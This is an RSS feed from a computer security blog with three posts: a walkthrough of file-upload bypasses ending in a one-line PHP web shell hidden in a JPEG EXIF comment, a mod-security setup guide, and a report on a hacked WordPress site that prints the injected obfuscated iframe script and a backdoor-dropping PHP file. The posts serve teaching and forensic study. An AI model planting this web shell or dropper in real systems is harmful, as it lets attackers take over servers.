@@ -1,0 +1,420 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>PHP &#8211; Phocean.net</title>
+	<atom:link href="/blog-archive/tag/php/feed" rel="self" type="application/rss+xml" />
+	<link>/blog-archive</link>
+	<description>Computer Security Blog</description>
+	<lastBuildDate>Fri, 24 Feb 2017 21:17:51 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.10</generator>
+	<item>
+		<title>File upload vulnerabilities : appending PHP code to an image</title>
+		<link>/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html</link>
+		<comments>/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html#comments</comments>
+		<pubDate>Sun, 29 Sep 2013 21:03:05 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Pentesting]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[file upload]]></category>
+		<category><![CDATA[pentest]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=1666</guid>
+		<description><![CDATA[Several ways may be used to protect a file upload functionality on a website. A first method is content-type checking, which can be easily bypassed with a intercepting proxy (tampering the MIME type). The screenshot below shows an intercepted request where the attacker modifies the content-type (beforehand text/php) and then forwards the content to the...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>Several ways may be used to protect a file upload functionality on a website.</p>
+<p>A first method is <strong>content-type </strong>checking, which can be easily bypassed with a intercepting proxy (tampering the MIME type). The screenshot below shows an intercepted request where the attacker modifies the content-type (beforehand <code>text/php</code>) and then forwards the content to the server:</p>
+<div id="attachment_1667" style="width: 590px" class="wp-caption aligncenter"><img class="size-medium wp-image-1667" alt="HTTP POST content-type tampering" src="/blog-archive/wp-content/uploads/2013/09/CapturFiles_13-580x313.png" width="580" height="313" srcset="/blog-archive/wp-content/uploads/2013/09/CapturFiles_13-580x313.png 580w, /blog-archive/wp-content/uploads/2013/09/CapturFiles_13-624x337.png 624w, /blog-archive/wp-content/uploads/2013/09/CapturFiles_13.png 902w" sizes="(max-width: 580px) 100vw, 580px" /><p class="wp-caption-text">HTTP POST content-type tampering</p></div>
+<p>Thus, the content-type filtering is bypassed.</p>
+<p>Another method consists in checking the file name <strong>extension</strong>. If simple bypasses like playing with lowercase (<code>.PHP</code> instead of <code>.php</code>), using multiple extension (<code>.php.foo</code>) or triggering the NULL byte (<code>.php%00.jpg</code>) do not work, there is a last chance by uploading a crafted image.</p>
+<p>JPEG files are convenient for code injection: they support EXIF metadata, which include a <em>comment</em> field where anything can be written, as long as it is on a single line.</p>
+<p>So, when a web server parses the image content, it may interpret the PHP code inside if it is improperly secured.</p>
+<p>The method is however totally dependent on the ability to upload a <code>.htaccess</code> file, which may be a long way to go.</p>
+<p>Though, one advantage of using an image in most upload vulnerability exploitation cases is stealth: an image will always look less suspicious than a dropped <code>.php</code> file.</p>
+<p>Anyway, for fun, here is how to do:</p>
+<ol class="split start">
+<li>Upload a <code>.htaccess</code> file that contains:
+<pre>AddType application/x-httpd-php .jpg</pre>
+</li>
+<li>Take a JPEG file of your choice, install the <a title="Jhead" href="http://www.sentex.net/~mwandel/jhead/">jhead</a> tool (there are many alternatives, like <a title="exiftool" href="http://www.sno.phy.queensu.ca/~phil/exiftool/">exiftool</a>, but this one is straightforward).</li>
+<li>House-keeping (delete extra headers):
+<pre>jhead -purejpg &lt;filename&gt;.jpg</pre>
+</li>
+<li>Edit EXIF JPEG comment:
+<pre>jhead -ce &lt;filename&gt;.jpg</pre>
+</li>
+<li>Copy / paste your PHP code, like this one for instance (must fit in one line):
+<pre>&lt;style&gt;body{font-size: 0;}h1{font-size: 12px}&lt;/style&gt;&lt;h1&gt;&lt;?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '&lt;img src="./clean_imagejs';}__halt_compiler();?&gt;&lt;/h1&gt;</pre>
+<p>This code just reads a command from the cmd parameter when it is set. If it is absent, then for more discretion it displays another image (clean_image.jpg, that you would have uploaded previously, for instance). The CSS style trick (font size of 0) just hides some garbage that comes from the JPEG header.</li>
+<li>Just upload the file and test it! <a title="DVWA" href="http://www.dvwa.co.uk">DVWA</a> is a convenient and safe way for that.</li>
+</ol>
+<p>Note this <a title="php image upload security how not to do it" href="http://nullcandy.com/php-image-upload-security-how-not-to-do-it/">nice article</a> as a reference on the topic, and the solution that is suggested to fix such a vulnerability: disabling one way or another script execution on the upload directory and use random server-side file renaming.</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html/feed</wfw:commentRss>
+		<slash:comments>6</slash:comments>
+		</item>
+		<item>
+		<title>How-to : Mod-security 2 set-up for Apache 2</title>
+		<link>/blog-archive/2008/07/13/how-to-mod-security-2-set-up-for-apache-2.html</link>
+		<pubDate>Sun, 13 Jul 2008 01:13:54 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Security]]></category>
+		<category><![CDATA[Apache]]></category>
+		<category><![CDATA[Debian]]></category>
+		<category><![CDATA[mod-security]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[regxp]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=114</guid>
+		<description><![CDATA[Mod-security is a security proxy for Apache. It adds a frontal layer filtering unwanted clients, malformed packets and malicious requests. It is especially usefull if your website is dynamic, involving php, sql, javascript, etc. With such a complex environment, as you can never be sure that your website is not vulnerable or up-to-date enough, something...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/07/13/how-to-mod-security-2-set-up-for-apache-2.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>Mod-security is a security proxy for Apache. It adds a frontal layer filtering unwanted clients, malformed packets and malicious requests.</p>
+<p>It is especially usefull if your website is dynamic, involving php, sql, javascript, etc. With such a complex environment, as you can never be sure that your website is not vulnerable or up-to-date enough, something like mod-security provides an interesting extra-security layer.<br />
+<span id="more-114"></span></p>
+<p>Due to license issues, mod-security is no more shipped with Debian &#8211; it was until Debian Sarge.</p>
+<p>Fortunately, the Debian maintainer continue to provide some packages on his website.</p>
+<p>So, the easy way to set up mod-security on your Debian system is to add this line in your <strong>/etc/apt/source.list</strong> file :</p>
+<pre lang="bash">$ echo "deb http://etc.inittab.org/~agi/debian/libapache-mod-security2/ etch/" >> /etc/apt/source.list</pre>
+<p>
+Then type in the usual sequence :</p>
+<pre lang="bash">$ aptitude update && aptitude install libapache-mod-security2</pre>
+<p>You could also download the source from <a title="mod-security" href="http://www.modsecurity.org/download/index.html">the official website</a>.<br />
+<br />
+Once it is done, comes the configuration part. The configuration is critical because any mistake on it will make it at best useless, or at worst blocking your website.<br />
+You have the choice between creating your rules from scratch or getting some ready made.<br />
+Creating your rules will require a lot of time and expertise in the http protocol, php, sql, and any other service that you offer with Apache.<br />
+That was not really my case, so I started to look for some ready made rules on google. I could not get good ones. Most of tutorial gives only some very basic and incomplete rules : useless. I found a good paper, notably containing some specific rules for WordPress, but the rules were written for mod-security v1 whereas it is now in its second version.<br />
+Oh, did I forget to tell you ? Most of the syntax was changed between the two versions !!! Not very nice, even if it was worth doing it.</p>
+<p>Finally, I came to find a way with the rules provided by this website, <a title="Go Root ? mod-security rules" href="http://gotroot.com/tiki-index.php?page=Setup+of+mod_security">Got Root ?</a>. They provide quite up-to-date rules, with a delay of 30 days subscription-free, which is quite acceptable for what I want to do. After all, Php exploits and Sql injection technics don&#8217;t change every day.</p>
+<p>The rules are also complete and spread over several files, one for each category in : generic rules, blacklist, usergents, proxies, rootkits&#8230;</p>
+<p>We can fetch them with a little script. They suggest to add it as a cron job, but you <strong><em>should not</em></strong>, except if you don&#8217;t mind that your website becomes unavailable ! These rules always require testing, some of them may be broken or require customizing&#8230; be careful and always check what&#8217;s inside the rule files !</p>
+<p>Here is the small script, <strong>modsec.sh</strong>, that I made to retrieve the rules and put them in the right directory :</p>
+<pre lang="bash">#!/bin/sh
+
+wget http://www.gotroot.com/downloads/ftp/mod_security/2.0/apache2/apache2-gotrootrules-modsec2.0-latest.tar.gz
+if [ -e apache2-gotrootrules-modsec2.0-latest.tar.gz ]
+then
+tar -xzvf apache2-gotrootrules-modsec2.0-latest.tar.gz -C /etc/apache2/modsecurity/
+fi
+rm apache2-gotrootrules-modsec2.0-latest.tar.gz
+/etc/init.d/apache2 restart</pre>
+<p>
+Make it executable and run it :</p>
+<pre lang="bash"># chmod +x modsec.sh
+$ ./modsec.sh</pre>
+<p>
+Now, let&#8217;s edit the <strong>/etc/apache2/apache2.conf </strong>file.</p>
+<p>Just before these lines (probably at the bottom of the file) :</p>
+<pre lang="bash"># Include the virtual host configurations:
+Include /etc/apache2/sites-enabled/</pre>
+<p>
+Add these :</p>
+<pre lang="bash">#Turn the filtering engine On or Off
+SecRuleEngine On
+SecRequestBodyAccess On
+SecResponseBodyAccess Off
+
+# Handling of file uploads
+# TODO Choose a folder private to Apache.
+# SecUploadDir /opt/apache-frontend/tmp/
+SecUploadKeepFiles Off
+
+# Maximum request body size we will
+# accept for buffering
+SecRequestBodyLimit 131072
+# Store up to 128 KB in memory
+SecRequestBodyInMemoryLimit 131072
+# Buffer response bodies of up to
+# 512 KB in length
+SecResponseBodyLimit 524288
+
+SecDebugLog /var/log/apache2/modsec_debug.log
+SecDebugLogLevel 0
+# Serial audit log
+SecAuditEngine RelevantOnly
+SecAuditLogRelevantStatus ^5
+SecAuditLogParts ABIFHZ
+SecAuditLogType Serial
+SecAuditLog /var/log/apache2/modsec_audit.log
+
+#should mod_security inspect POST payloads
+#SecRuleScanPOST On
+
+# by default log and deny suspicious requests with HTTP status 500
+SecDefaultAction log,auditlog,deny,status:403,phase:2,t:none
+
+#First, add in your exclusion rules:
+#These MUST come first!
+Include /etc/apache2/modsecurity/exclude.conf
+
+#Application protection rules
+Include /etc/apache2/modsecurity/rules.conf
+
+#Comment spam rules
+Include /etc/apache2/modsecurity/blacklist.conf
+
+#Bad hosts, bad proxies and other bad players
+Include /etc/apache2/modsecurity/blacklist2.conf
+
+#Bad clients, known bogus useragents and other signs of malware
+Include /etc/apache2/modsecurity/useragents.conf
+
+#Known bad software, rootkits and other malware
+Include /etc/apache2/modsecurity/rootkits.conf
+
+#Signatures to prevent proxying through your server
+#only rule these rules if your server is NOT a proxy
+#Include /etc/apache2/modsecurity/proxy.conf
+
+#Additional rules for Apache 2.x ONLY!  Do not add this line if you use Apache 1.x
+Include /etc/apache2/modsecurity/apache2-rules.conf</pre>
+<p>As you can see, we just include the rule files we just downloaded. You can easily activate or deactivate some to fit your needs.</p>
+<p>You will probably notice that there is a performance impact after activating mod-security &#8211; not so big to me, but it also depends on your traffic. It is up to you to optimize the number of activated rules to make it faster.</p>
+<p>If some page appear to be blocked, check the<strong> /var/log/apache2/error.log </strong>for something like :</p>
+<pre lang="text">[Fri Jul 11 19:33:08 2008] [error] [client 192.168.222.21] ModSecurity: Access
+denied with code 500 (phase 2). Match of "rx ^HTTP/(0\\\\.9|1\\\\.0|1\\\\.1|1\\
+\\.2)$" against "REQUEST_PROTOCOL" required. [<strong>id "340000"</strong>] [msg "Bad HTTP Proto
+col"] [severity "ALERT"] [hostname "www.phocean.net"] [uri "/"] [unique_id "72F
+mG38AAAEAACa@AVUAAAAA"]</pre>
+<p>The ID number of the blocking rule is given. Just grep to find the faulty rule and correct / deactivate it :</p>
+<pre lang="bash">$ grep 340000 /etc/apache2/modsecurity</pre>
+<p>Regxp knowledge required ! :D</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Hacked !</title>
+		<link>/blog-archive/2008/06/03/hacked.html</link>
+		<comments>/blog-archive/2008/06/03/hacked.html#comments</comments>
+		<pubDate>Tue, 03 Jun 2008 20:25:25 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Forensic]]></category>
+		<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[News]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[Injection]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Spam]]></category>
+		<category><![CDATA[SQL]]></category>
+		<category><![CDATA[Wordpress]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=109</guid>
+		<description><![CDATA[This blog got hacked yesterday. It looks like some spammer managed to inject some PHP code into almost all *.php files of WordPress. It was not just like the classic SQL injection that is usually used to post some malicious post. The following code was added : &#60;?php echo '&#60;script type=&#34;text/javascript&#34;&#62;function count(str){var res = &#34;&#34;;for(i...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/06/03/hacked.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>This blog got hacked yesterday.</p>
+<p>It looks like some spammer managed to inject some PHP code into almost all *.php files of WordPress.<br />
+It was not just like the classic SQL injection that is usually used to post some malicious post.</p>
+<p>The following code was added :</p>
+<pre>&lt;?php echo '&lt;script type=&quot;text/javascript&quot;&gt;function count(str){var res = &quot;&quot;;for(i = 0; i &lt; str.length; ++i) { n = str.charCodeAt(i); res += String.fromCharCode(n - (2)); } return res; }; document.write(count(&quot;&gt;khtcog\&quot;ute?jvvr&lt;11yyy0yr/uvcvu/rjr0kphq1khtcog1yr/uvcvu0rjr\&quot;ykfvj?3\&quot;jgkijv?3\&quot;htcogdqtfgt?2@&quot;));&lt;/script&gt;';?&gt;</pre>
+<p><span id="more-109"></span></p>
+<p>It make me think that there is a serious vulnerability somewhere on WordPress or a plugin, though my versions were up-to-date.</p>
+<p>Now the blog is back to normal, after a clean reinstallation (erased all the former files).</p>
+<p><a title="Wordpress, hacked" href="http://wordpress.org/support/topic/179428/page/2" target="_blank">I am not the only one to experience this mess</a>.</p>
+<p>For now, the blog is running with a minimal number of plugin &#8211; just akismet, actually &#8211; until the cause of that gets clearer.</p>
+<p>Not a lot of plugins runned before, so it mainly means that the OpenID support for authentication is cut off.</p>
+<p>As my php knowledge is very low, anyone having some tips is welcome. I love WordPress, I would like to avoid looking for another platform or switch to static html !</p>
+<p>&#8212;</p>
+<p><strong>UPDATE 06/13/2008 :</strong><br />
+As C.S Lee suggested in a comment, there were a very suspicious wp-stats.php file in the root of my hacked archive.</p>
+<p>There is the code :</p>
+<pre>
+&lt;?php
+
+@error_reporting(E_ALL);
+@set_time_limit(0);
+mt_srand(crc32(microtime()));
+  
+  
+define('SHCODE', 'PDaWYgKCRjb2RlID0gQGZyZWFkKEBmb3BlbigkSFRUCmVjaG8gIjwvcHJlPiI7Cj8+');
+
+$pres = array('lib_','co_','pre_','net_','func_','ad_','ext_','new_','old_','fix_','fixed_','na_','av_','fx_');  
+$fui = $pres[array_rand($pres)];
+
+global $HTTP_SERVER_VARS;
+$START = time();
+$WD_TIMEOUT = array(8, 7, 6, 6, 5, 5, 5, 5, 0);
+
+function my_fwrite($f, $data) {
+  global $CURFILE;
+  $file_mtime = @filemtime($f);
+  $file_atime = @fileatime($f);
+  $dir_mtime = @filemtime(@dirname($f));
+  $dir_atime = @fileatime(@dirname($f));
+  if ($file_h = @fopen($f, &quot;wb&quot;)) {
+    @fwrite($file_h, $data); @fclose($file_h);
+    if ($file_mtime) {
+      @touch($f, $file_mtime, $file_atime);
+    } elseif (@filemtime($CURFILE)) {
+      @chmod($f, @fileperms($CURFILE));
+      @touch($f, @filemtime($CURFILE), @fileatime($CURFILE));
+      @chgrp($f, @filegroup($CURFILE));
+      @chown($f, @fileowner($CURFILE));
+    };
+    if ($dir_mtime) @touch(@dirname($f), $dir_mtime, $dir_atime);
+    return $f;
+  } else {
+    return '';
+  };
+};
+
+function ext($f) {
+  return substr($f, strrpos($f, &quot;.&quot;) + 1);
+};
+
+function walkdir($p, $func='_walkdir', $l=0) {
+  global $START;
+  global $WD_TIMEOUT;
+  global $FL;
+  $func_f = &quot;{$func}_f&quot;;
+  $func_d = &quot;{$func}_d&quot;;
+  $func_s = &quot;{$func}_s&quot;;
+  $func_e = &quot;{$func}_e&quot;;
+  if ($dh = @opendir(&quot;$p&quot;)) {
+    if (function_exists($func_s)) {
+      if ($func_s($p, $l)) return 1;
+    };
+    while ($f = @readdir($dh)) {
+      if (time() - $START &gt;= $WD_TIMEOUT[$l] ) break;
+      if ($f == '.' || $f == '..' ) continue;
+      if (@is_dir (&quot;$p$f/&quot;) ) walkdir(&quot;$p$f/&quot;, $func, $l+1);
+      if (@is_dir (&quot;$p$f/&quot;) &amp;&amp; function_exists($func_d))
+        $func_d(&quot;$p$f/&quot;, $l);
+      if (@is_file(&quot;$p$f&quot; ) &amp;&amp; function_exists($func_f))
+        $func_f(&quot;$p$f&quot; , $l);
+    };
+    closedir($dh);
+    if (function_exists($func_e)) $func_e($p, $l);
+  };
+};
+
+function r_cut($p) {
+  global $R;
+  return substr($p, strlen($R));
+};
+
+function say($t) {
+  echo &quot;$t\n&quot;;
+};
+
+function testdata($t) {
+  say(md5(&quot;mark_$t&quot;));
+};
+
+$R = $HTTP_SERVER_VARS['DOCUMENT_ROOT'];
+$CURFILE = $HTTP_SERVER_VARS['DOCUMENT_ROOT'] .
+  $HTTP_SERVER_VARS['SCRIPT_NAME'];
+echo &quot;&lt;pre&gt;&quot;;
+testdata('start');
+$fe = ext($CURFILE);
+if (!$fe) $fe = 'php';
+//$FN = &quot;namogofer.$fe&quot;;
+
+function _walkdir_s($d, $l) {
+  global $FCNT;
+  $FCNT = array( 'fn' =&gt; '', 'dir' =&gt; 0, 'file' =&gt; 0, 'simtype' =&gt; 0 );
+};
+
+function _walkdir_d($d,$l) {
+  global $FCNT;
+  $FCNT['dir' ]++;
+};
+
+function _walkdir_f($f,$l) {
+  global $FCNT, $CURFILE;
+  $FCNT['file']++;
+  if (ext($f) == ext($CURFILE)) $FCNT['simtype']++;
+};
+
+function update_passwd($data)
+  {
+  global $FCNT;
+  $password = &quot;&quot;;
+  $possible = &quot;abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*&quot;; 
+  $i = 0;
+  while ($i &lt; 15) 
+    { 
+    $char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
+    if (!strstr($password, $char)) 
+      { 
+      $password .= $char;
+      $i++;
+      }
+    }
+  $FCNT['passwd'] = $password;
+  $md5password = md5($password);
+  return preg_replace(&quot;|define\('PASSWD',\s*'(.*)'|&quot;, &quot;define('PASSWD','$md5password'&quot;, $data);
+  }
+
+function notinf($ar, $tx)
+  {
+  $R = true;
+  foreach ($ar as $ca)
+    {
+    //echo &quot;pass &quot;.substr($tx, 0, strlen($ca)).&quot; in $tx for $ca\n&quot;;
+    if (&quot;$ca&quot; == substr($tx, 0, strlen($ca)))
+      {
+      $R = false;
+      //echo &quot;gotcha\n&quot;;
+      break;
+      }
+    }
+  return $R;
+  }
+
+function _walkdir_e($d,$l) 
+  {
+  global $C, $FCNT, $FN, $fui, $pres;
+  
+    $the_data = base64_decode(SHCODE);
+    $the_dir = opendir(&quot;$d&quot;);
+    $is_php=false;
+    if ($the_dir)
+        while($cfile = readdir($the_dir))
+            {
+            if(
+                $is_php=
+                
+                (('.php' == substr($cfile, -4))and
+                 notinf($pres, $cfile)and
+                ($cfile!='index.php'))
+                 
+              )
+              {
+              $FN = &quot;$fui$cfile&quot;;
+              break;
+              }
+              else
+              {
+              //echo &quot;pass $cfile\n&quot;;
+              }
+            }
+                         
+        if ( $is_php and my_fwrite(&quot;$d$FN&quot;, str_repeat(&quot;\n&quot;,100) . str_repeat('', 150) .
+                    update_passwd($the_data . str_repeat(' ', 150) . &quot;\n&quot; . str_repeat(&quot;\n&quot;, 100))))
+                    {
+                    $FCNT['fn'] = r_cut(&quot;$d$FN&quot;);
+                    say(implode(&quot; &quot;, $FCNT));
+                    }
+
+  };
+
+walkdir(&quot;$R/&quot;);
+testdata('end');
+?&gt;</pre>
+<p>I will try anyway to put a deeper look when I have a little time : now, I have to go to work.</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2008/06/03/hacked.html/feed</wfw:commentRss>
+		<slash:comments>5</slash:comments>
+		</item>
+	</channel>
+</rss>
